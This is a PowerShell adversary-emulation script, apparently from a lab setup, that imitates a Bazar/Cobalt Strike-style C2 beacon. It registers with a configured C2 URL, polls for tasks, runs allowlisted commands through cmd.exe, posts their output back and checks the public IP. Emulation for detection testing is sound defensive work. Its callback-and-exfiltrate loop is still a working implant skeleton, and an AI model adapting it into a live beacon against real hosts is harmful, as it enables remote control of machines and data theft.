# ============================================================
# c0015_beacon.ps1 — benign session beacon [LAB-SURROGATE]
#
# Campaign mapping:
#   - Bazar/CS-like callback loop over web channel      -> T1071.001 (context)
#   - public-IP check (myexternalip analog)             -> T1016
#   - fixed allowlisted task execution (no shell)       -> C2 role surrogate
#
# NO HARDCODED LAB VALUES: everything is read from the config
# INI (-Config). Session token comes from environment
# ($env:C0015_SESSION_TOKEN) or is generated per run (S1-<16 hex>).
#
# Usage (operator/harness):
#   powershell -NoProfile -ExecutionPolicy Bypass -File c0015_beacon.ps1 -Config <ini> [-Once]
# ============================================================
param(
    [Parameter(Mandatory=$true)][string]$Config,
    [switch]$Once
)
$ErrorActionPreference = 'Stop'

function Get-IniValue {
    param([string]$Path, [string]$Section, [string]$Key)
    $val = $null
    $cur = ''
    foreach ($ln in Get-Content -LiteralPath $Path) {
        $t = $ln.Trim()
        if ($t -match '^\[(.+)\]$') { $cur = $Matches[1] }
        elseif ($cur -eq $Section -and $t -like "$Key=*") { $val = $t.Substring($Key.Length + 1) }
    }
    return $val
}

# ---- config (no hardcoded lab values) ----
$cfg = Get-Item -LiteralPath $Config | ForEach-Object { $_.FullName }
$c2Url   = Get-IniValue $cfg 'c2sim' 'c2_url'
$stage   = Get-IniValue $cfg 'c2sim' 'stage'
$hostAlias = Get-IniValue $cfg 'c2sim' 'host_alias'
$runId   = Get-IniValue $cfg 'lab' 'run_id'
$loops   = [int](Get-IniValue $cfg 'beacon' 'loop_count')
$sleep   = [int](Get-IniValue $cfg 'beacon' 'loop_sleep_sec')
$ipCheck = Get-IniValue $cfg 'beacon' 'public_ip_check_enabled'
$ipUrl   = Get-IniValue $cfg 'beacon' 'public_ip_check_url'
$cap     = [int](Get-IniValue $cfg 'beacon' 'result_cap_bytes')

# ---- allowlisted task -> benign command map (from config, no arbitrary input) ----
$taskMap = @{
    'T-DISCOVER-CORPUS' = Get-IniValue $cfg 'beacon' 'task_T-DISCOVER-CORPUS'
    'T-BEACON-SLEEP'    = Get-IniValue $cfg 'beacon' 'task_T-BEACON-SLEEP'
    'T-NOOP'            = Get-IniValue $cfg 'beacon' 'task_T-NOOP'
}

# ---- session token: env or generated per run (never stored) ----
$tokenEnv = Get-IniValue $cfg 'c2sim' 'token_env'
$token = $env:C0015_SESSION_TOKEN
if (-not $token) {
    $token = 'S1-' + ([BitConverter]::ToString([System.Security.Cryptography.RandomNumberGenerator]::GetBytes(8)) -replace '-','').ToLower()
}

# ---- T1016: public-IP style check against lab mock ----
if ($ipCheck -eq '1' -and $ipUrl) {
    try { Invoke-WebRequest -Uri $ipUrl -UseBasicParsing -TimeoutSec 5 | Out-Null } catch { }
}

# ---- register + task/result loop (bounded) ----
$registerUrl = "$c2Url/session/register?stage=$stage&host=$hostAlias&token=$token&run=$runId"
try {
    Invoke-WebRequest -Method POST -Uri $registerUrl -UseBasicParsing -TimeoutSec 10 | Out-Null
} catch {
    Write-Output "register failed: $($_.Exception.Message)"; exit 1
}

$count = if ($Once) { 1 } else { $loops }
for ($i = 0; $i -lt $count; $i++) {
    $taskResp = Invoke-WebRequest -Method GET -Uri "$c2Url/task/next?session=$token" -UseBasicParsing -TimeoutSec 10
    $task = ($taskResp.Content | ConvertFrom-Json).task
    $cmd = $taskMap[$task]
    if (-not $cmd) { $cmd = $taskMap['T-NOOP'] }
    # bounded benign execution of an allowlisted command
    $result = & cmd.exe /c $cmd 2>&1 | Out-String
    if ($result.Length -gt $cap) { $result = $result.Substring(0, $cap) }
    $body = [System.Text.Encoding]::UTF8.GetBytes($result)
    Invoke-WebRequest -Method POST -Uri "$c2Url/result?session=$token&task=$task" -Body $body -UseBasicParsing -TimeoutSec 10 | Out-Null
    Start-Sleep -Seconds $sleep
}
Write-Output "beacon cycle complete (stage=$stage host=$hostAlias token=${token})"
